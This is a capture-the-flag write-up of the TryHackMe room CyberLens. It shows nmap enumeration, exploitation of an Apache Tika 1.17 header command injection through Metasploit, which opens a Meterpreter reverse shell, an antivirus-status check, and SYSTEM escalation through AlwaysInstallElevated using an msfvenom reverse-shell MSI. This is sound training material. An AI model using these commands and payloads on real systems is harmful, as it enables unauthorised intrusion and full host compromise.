---
title: "CyberLens"
date: 2025-03-07
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF CyberLens
categories: [TryHackMe, Easy]
tags: [Windows, taki, metasploit]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>CyberLens</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Can you exploit the CyberLens web server and discover the hidden flags?</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/cyberlensp6">https://tryhackme.com/room/cyberlensp6</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge CyberLens.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.52.174
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 12:33 EDT
  Nmap scan report for cyberlens.thm (10.10.52.174)
  Host is up (0.041s latency).
  Not shown: 65519 closed tcp ports (conn-refused)
  PORT      STATE SERVICE
  80/tcp    open  http
  135/tcp   open  msrpc
  139/tcp   open  netbios-ssn
  445/tcp   open  microsoft-ds
  3389/tcp  open  ms-wbt-server
  5985/tcp  open  wsman
  47001/tcp open  winrm
  49664/tcp open  unknown
  49665/tcp open  unknown
  49666/tcp open  unknown
  49667/tcp open  unknown
  49668/tcp open  unknown
  49669/tcp open  unknown
  49670/tcp open  unknown
  49675/tcp open  unknown
  61777/tcp open  unknown

  Nmap done: 1 IP address (1 host up) scanned in 60.99 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 80,135,139,445,3389,5985,7680,47001,61777 10.10.52.174 
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-07 12:38 EDT
  Nmap scan report for cyberlens.thm (10.10.52.174)
  Host is up (0.042s latency).

  PORT      STATE SERVICE       VERSION
  80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
  |_http-server-header: Apache/2.4.57 (Win64)
  | http-methods: 
  |_  Potentially risky methods: TRACE
  |_http-title: CyberLens: Unveiling the Hidden Matrix
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds?
  3389/tcp  open  ms-wbt-server Microsoft Terminal Services
  |_ssl-date: 2025-03-14T16:39:03+00:00; -14s from scanner time.
  | ssl-cert: Subject: commonName=CyberLens
  | Not valid before: 2025-03-13T16:25:49
  |_Not valid after:  2025-09-12T16:25:49
  | rdp-ntlm-info: 
  |   Target_Name: CYBERLENS
  |   NetBIOS_Domain_Name: CYBERLENS
  |   NetBIOS_Computer_Name: CYBERLENS
  |   DNS_Domain_Name: CyberLens
  |   DNS_Computer_Name: CyberLens
  |   Product_Version: 10.0.17763
  |_  System_Time: 2025-03-14T16:38:56+00:00
  5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-title: Not Found
  |_http-server-header: Microsoft-HTTPAPI/2.0
  7680/tcp  open  pando-pub?
  47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-server-header: Microsoft-HTTPAPI/2.0
  |_http-title: Not Found
  61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
  |_http-server-header: Jetty(8.y.z-SNAPSHOT)
  |_http-cors: HEAD GET
  |_http-title: Site doesn't have a title (text/plain).
  | http-methods: 
  |_  Potentially risky methods: PUT
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  Host script results:
  | smb2-security-mode: 
  |   3:1:1: 
  |_    Message signing enabled but not required
  | smb2-time: 
  |   date: 2025-03-14T16:38:56
  |_  start_date: N/A
  |_clock-skew: mean: -14s, deviation: 0s, median: -14s

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 52.08 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

I began by analyzing the webpage and performed a directory enumeration, but I didn't discovered anything useful. While the enumeration was running, I analyzed the source code and found a section which caught my attention:
```JavaScript
 fetch("http://cyberlens.thm:61777/meta", {
            method: "PUT",
            body: fileData,
            headers: {
              "Accept": "application/json",
              "Content-Type": "application/octet-stream"
```
The source code referenced port 61777.

## Port 445 Analysis

I conducted an enumeration of SMB shares using `enum4linux`, but the tool didn't returned anything.

## Port 61777 Analysis

The website displayed a Tika server, version 1.17. After researching this service, I found an entry in the <a href="https://www.exploit-db.com/exploits/47208">Exploit-DB</a> that referred to Metasploit:

![Taki Server Version](/assets/img/tryhackme/Cyberlens/thm_cyberlens_1.jpg)

```bash
  msf6 > search Tika

  Matching Modules
  ================

    #  Name                                                 Disclosure Date  Rank       Check  Description
    -  ----                                                 ---------------  ----       -----  -----------
    0  exploit/windows/http/apache_tika_jp2_jscript         2018-04-25       excellent  Yes    Apache Tika Header Command Injection
    1  post/linux/gather/puppet                             .                normal     No     Puppet Config Gather
    2  auxiliary/scanner/http/wp_gimedia_library_file_read  .                normal     No     WordPress GI-Media Library Plugin Directory Traversal Vulnerability
```

I loaded the module, set the required options, executed the exploit, and successfully retrieved the user flag:
```bash
  msf6 > use exploit/windows/http/apache_tika_jp2_jscript
  [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RHOSTS 10.10.52.174
  RHOSTS => 10.10.52.174
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
  RPORT => 61777
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > set SRVHOST tun0
  SRVHOST => [removed]
  msf6 exploit(windows/http/apache_tika_jp2_jscript) > set LHOST tun0
  LHOST => [removed]

  msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit

  [*] Started reverse TCP handler on [removed]:4444 
  [*] Running automatic check ("set AutoCheck false" to disable)
  [+] The target is vulnerable.
  [...]
  [*] Command Stager progress - 100.00% done (98798/98798 bytes)
  [*] Sending stage (176198 bytes) to 10.10.52.174
  [*] Meterpreter session 1 opened ([removed]:4444 -> 10.10.52.174:49783) at 2025-03-14 12:45:37 -0400

  meterpreter > cd C:\\Users\\CyberLens\\Desktop\\
  meterpreter > cat user.txt
  THM{T[removed]n}
```

## Privilege Escalation root

Since I gained initial access via a Meterpeter reverse shell, I was able to switch to the PowerShell console. From there, I ran `Get-MpComputerStatus` to check if any antivirus systems where in place that could interfere with privilege escalation:
```bash
  PS C:\> Get-MpComputerStatus
  AMEngineVersion                  : 0.0.0.0
  AMProductVersion                 : 4.18.23050.3
  AMRunningMode                    : Not running
  AMServiceEnabled                 : False
  AMServiceVersion                 : 0.0.0.0
  AntispywareEnabled               : False
  AntispywareSignatureAge          : 4294967295
  AntispywareSignatureLastUpdated  : 
  AntispywareSignatureVersion      : 0.0.0.0
  AntivirusEnabled                 : False
  AntivirusSignatureAge            : 4294967295
  AntivirusSignatureLastUpdated    : 
  AntivirusSignatureVersion        : 0.0.0.0
  BehaviorMonitorEnabled           : False
  ComputerID                       : 3DBFE4F2-4B29-4FF5-531E-E6C7CDAE6B2E
  ComputerState                    : 0
  DefenderSignaturesOutOfDate      : False
  DeviceControlDefaultEnforcement  : N/A
  DeviceControlPoliciesLastUpdated : 1/1/1601 12:00:00 AM
  DeviceControlState               : N/A
  FullScanAge                      : 4294967295
  FullScanEndTime                  : 
  FullScanOverdue                  : False
  FullScanRequired                 : False
  FullScanSignatureVersion         : 
  FullScanStartTime                : 
  IoavProtectionEnabled            : False
  IsTamperProtected                : False
  IsVirtualMachine                 : True
  LastFullScanSource               : 0
  LastQuickScanSource              : 0
  NISEnabled                       : False
  NISEngineVersion                 : 0.0.0.0
  NISSignatureAge                  : 4294967295
  NISSignatureLastUpdated          : 
  NISSignatureVersion              : 0.0.0.0
  OnAccessProtectionEnabled        : False
  ProductStatus                    : 1
  QuickScanAge                     : 4294967295
  QuickScanEndTime                 : 
  QuickScanOverdue                 : False
  QuickScanSignatureVersion        : 
  QuickScanStartTime               : 
  RealTimeProtectionEnabled        : False
  RealTimeScanDirection            : 0
  RebootRequired                   : False
  SmartAppControlExpiration        : 
  SmartAppControlState             : 
  TamperProtectionSource           : N/A
  TDTMode                          : N/A
  TDTSiloType                      : N/A
  TDTStatus                        : N/A
  TDTTelemetry                     : N/A
  TroubleShootingDailyMaxQuota     : 
  TroubleShootingDailyQuotaLeft    : 
  TroubleShootingEndTime           : 
  TroubleShootingExpirationLeft    : 
  TroubleShootingMode              : 
  TroubleShootingModeSource        : 
  TroubleShootingQuotaResetTime    : 
  TroubleShootingStartTime         : 
  PSComputerName                   :
```

The cmdlet indicated that no antivirus mechanism were active, so I proceeded to download and execute `winPEAS`:
```bash
PS C:\> $env:PROCESSOR_ARCHITECTURE
  $env:PROCESSOR_ARCHITECTURE
  x86
PS C:\> exit
meterpreter > cd C:\\Users\\CyberLens\\Desktop\\
meterpreter > upload winPEASx86.exe
  [*] Uploading  : /home/kali/ctf/cyberlens/winPEASx86.exe -> winPEASx86.exe
  [*] Uploaded 8.00 MiB of 9.67 MiB (82.69%): /home/kali/ctf/cyberlens/winPEASx86.exe -> winPEASx86.exe
  [*] Uploaded 9.67 MiB of 9.67 MiB (100.0%): /home/kali/ctf/cyberlens/winPEASx86.exe -> winPEASx86.exe
  [*] Completed  : /home/kali/ctf/cyberlens/winPEASx86.exe -> winPEASx86.exe

meterpreter > shell
  C:\Users\CyberLens\Dekstop> winPEASx86.exe
```

While analyzing the output, it stood out that `AlwaysInstallElevated` was enabled:
```bash
����������͹ Checking AlwaysInstallElevated
�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
  AlwaysInstallElevated set to 1 in HKLM!
  AlwaysInstallElevated set to 1 in HKCU!
```

To exploit this, I created an MSI executable using msvenom, which opened a reverse shell to connect back to my machine:
```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=4444 -a x64 --platform Windows -f msi -o shell.msi

meterpreter > upload shell.msi
[*] Uploading  : /home/kali/ctf/cyberlens/shell.msi -> shell.msi
[*] Uploaded 156.00 KiB of 156.00 KiB (100.0%): /home/kali/ctf/cyberlens/shell.msi -> shell.msi
[*] Completed  : /home/kali/ctf/cyberlens/shell.msi -> shell.msi
meterpreter > shell.msi
```

After executing the MSI, I received the reverse shell and successfully retrieve the SYSTEM flag:
```bash
C:\Windows\system32>whoami
whoami
nt authority\system
C:\Windows\system32>cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{3[removed]!}
```

solved! :)